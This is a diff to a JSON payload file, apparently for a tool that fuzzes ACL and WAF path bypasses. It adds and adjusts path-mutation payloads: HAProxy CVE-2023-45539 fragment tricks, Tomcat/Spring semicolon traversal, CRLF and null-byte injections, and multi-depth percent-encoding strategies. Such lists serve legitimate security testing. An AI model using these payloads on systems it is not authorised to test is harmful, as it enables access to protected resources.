@@ -16,13 +16,13 @@
     { "id": "trailing-dotdot-null",  "value": "{{PATH}}/..%00",         "desc": "traversal + null byte", "requires_raw": true },
     { "id": "trailing-dotdot-nl",    "value": "{{PATH}}/..%0a",         "desc": "traversal + encoded newline", "requires_raw": true },
 
-    { "id": "fragment-bare",         "value": "{{PATH}}#",              "desc": "HAProxy CVE-2023-45539: bare fragment, ACL sees stripped path", "requires_raw": false, "source": "CVE-2023-45539" },
-    { "id": "fragment-png",          "value": "{{PATH}}#.png",          "desc": "HAProxy CVE-2023-45539: defeats path_end .png/.css/.js rules", "requires_raw": false, "source": "CVE-2023-45539" },
-    { "id": "fragment-css",          "value": "{{PATH}}#.css",          "desc": "HAProxy CVE-2023-45539 path_end bypass", "requires_raw": false, "source": "CVE-2023-45539" },
-    { "id": "fragment-js",           "value": "{{PATH}}#.js",           "desc": "HAProxy CVE-2023-45539 path_end bypass", "requires_raw": false, "source": "CVE-2023-45539" },
-    { "id": "fragment-public",       "value": "{{PATH}}#public",        "desc": "HAProxy CVE-2023-45539: defeats path_beg public rules", "requires_raw": false, "source": "CVE-2023-45539" },
-    { "id": "fragment-traversal",    "value": "{{PATH}}#../file.txt",   "desc": "HAProxy CVE-2023-45539: fragment + traversal", "requires_raw": false, "source": "CVE-2023-45539" },
-    { "id": "fragment-double",       "value": "{{PATH}}#/#",            "desc": "HAProxy CVE-2023-45539: double fragment", "requires_raw": false, "source": "CVE-2023-45539" }
+    { "id": "fragment-bare",         "value": "{{PATH}}#",              "desc": "HAProxy CVE-2023-45539: bare fragment, ACL sees stripped path", "requires_raw": true, "source": "CVE-2023-45539" },
+    { "id": "fragment-png",          "value": "{{PATH}}#.png",          "desc": "HAProxy CVE-2023-45539: defeats path_end .png/.css/.js rules", "requires_raw": true, "source": "CVE-2023-45539" },
+    { "id": "fragment-css",          "value": "{{PATH}}#.css",          "desc": "HAProxy CVE-2023-45539 path_end bypass", "requires_raw": true, "source": "CVE-2023-45539" },
+    { "id": "fragment-js",           "value": "{{PATH}}#.js",           "desc": "HAProxy CVE-2023-45539 path_end bypass", "requires_raw": true, "source": "CVE-2023-45539" },
+    { "id": "fragment-public",       "value": "{{PATH}}#public",        "desc": "HAProxy CVE-2023-45539: defeats path_beg public rules", "requires_raw": true, "source": "CVE-2023-45539" },
+    { "id": "fragment-traversal",    "value": "{{PATH}}#../file.txt",   "desc": "HAProxy CVE-2023-45539: fragment + traversal", "requires_raw": true, "source": "CVE-2023-45539" },
+    { "id": "fragment-double",       "value": "{{PATH}}#/#",            "desc": "HAProxy CVE-2023-45539: double fragment", "requires_raw": true, "source": "CVE-2023-45539" }
   ],
 
   "mid_paths": [
@@ -34,6 +34,10 @@
     { "id": "semicolon-matrix-dot",  "value": "/.;/{{PATH_NOSLASH}}",            "desc": "matrix param + dot", "requires_raw": true },
     { "id": "semicolon-matrix-2x",   "value": "//;//{{PATH_NOSLASH}}",           "desc": "matrix param, doubled slashes", "requires_raw": true },
     { "id": "semicolon-suffix",      "value": "{{PATH}}..;/",                    "desc": "classic Tomcat/Spring semicolon bypass", "requires_raw": true },
+    { "id": "semicolon-trail-slash", "value": "{{PATH}}/..;/",                   "desc": "trailing semicolon traversal variant (Spring)", "requires_raw": true },
+    { "id": "semicolon-inline",      "value": "{{PATH}};param=x",               "desc": "inline matrix param, no traversal (Tomcat/Spring)", "requires_raw": true },
+    { "id": "crlf-path",             "value": "{{PATH}}%0d%0a",                 "desc": "CRLF injection in path (old Nginx/IIS log injection / ACL split)", "requires_raw": true },
+    { "id": "null-byte-path",        "value": "{{PATH}}%00",                    "desc": "null byte path termination (PHP/old IIS)", "requires_raw": true },
     { "id": "encoded-dot-segment",   "value": "/%2e{{PATH}}",                    "desc": "single-encoded dot segment", "requires_raw": true },
     { "id": "double-encoded-dot",    "value": "/%252e{{PATH}}",                  "desc": "double-encoded dot (WAF decodes once, app decodes twice)", "requires_raw": true },
     { "id": "encoded-slash-prefix",  "value": "/%2f{{PATH_NOSLASH}}",            "desc": "encoded leading slash", "requires_raw": true },
@@ -48,12 +52,20 @@
   ],
 
   "raw_encoding_strategies": [
-    { "id": "enc-last-char",     "desc": "percent-encode only the final character of the path", "requires_raw": true },
-    { "id": "enc-first-char",    "desc": "percent-encode only the first character of the last segment", "requires_raw": true },
-    { "id": "enc-last-segment",  "desc": "percent-encode every character in the final path segment", "requires_raw": true },
-    { "id": "enc-full-path",     "desc": "percent-encode every character in the full path", "requires_raw": true },
-    { "id": "enc-full-segment",  "desc": "percent-encode every character, segment by segment", "requires_raw": true },
-    { "id": "enc-depth-2",       "desc": "apply the above strategy twice (double encoding)", "requires_raw": true, "depth": 2 },
-    { "id": "enc-depth-3",       "desc": "apply the above strategy three times (triple encoding)", "requires_raw": true, "depth": 3 }
+    { "id": "enc-last-char",        "desc": "percent-encode only the final character of the path (depth 1)", "requires_raw": true, "depth": 1 },
+    { "id": "enc-last-char-d2",     "desc": "percent-encode only the final character of the path (depth 2)", "requires_raw": true, "depth": 2 },
+    { "id": "enc-last-char-d3",     "desc": "percent-encode only the final character of the path (depth 3)", "requires_raw": true, "depth": 3 },
+    { "id": "enc-first-char",       "desc": "percent-encode only the first character of the last segment (depth 1)", "requires_raw": true, "depth": 1 },
+    { "id": "enc-first-char-d2",    "desc": "percent-encode only the first character of the last segment (depth 2)", "requires_raw": true, "depth": 2 },
+    { "id": "enc-first-char-d3",    "desc": "percent-encode only the first character of the last segment (depth 3)", "requires_raw": true, "depth": 3 },
+    { "id": "enc-last-segment",     "desc": "percent-encode every character in the final path segment (depth 1)", "requires_raw": true, "depth": 1 },
+    { "id": "enc-last-segment-d2",  "desc": "percent-encode every character in the final path segment (depth 2)", "requires_raw": true, "depth": 2 },
+    { "id": "enc-last-segment-d3",  "desc": "percent-encode every character in the final path segment (depth 3)", "requires_raw": true, "depth": 3 },
+    { "id": "enc-full-path",        "desc": "percent-encode every character in the full path (depth 1)", "requires_raw": true, "depth": 1 },
+    { "id": "enc-full-path-d2",     "desc": "percent-encode every character in the full path (depth 2)", "requires_raw": true, "depth": 2 },
+    { "id": "enc-full-path-d3",     "desc": "percent-encode every character in the full path (depth 3)", "requires_raw": true, "depth": 3 },
+    { "id": "enc-full-segment",     "desc": "percent-encode every character, segment by segment (depth 1)", "requires_raw": true, "depth": 1 },
+    { "id": "enc-full-segment-d2",  "desc": "percent-encode every character, segment by segment (depth 2)", "requires_raw": true, "depth": 2 },
+    { "id": "enc-full-segment-d3",  "desc": "percent-encode every character, segment by segment (depth 3)", "requires_raw": true, "depth": 3 }
   ]
 }
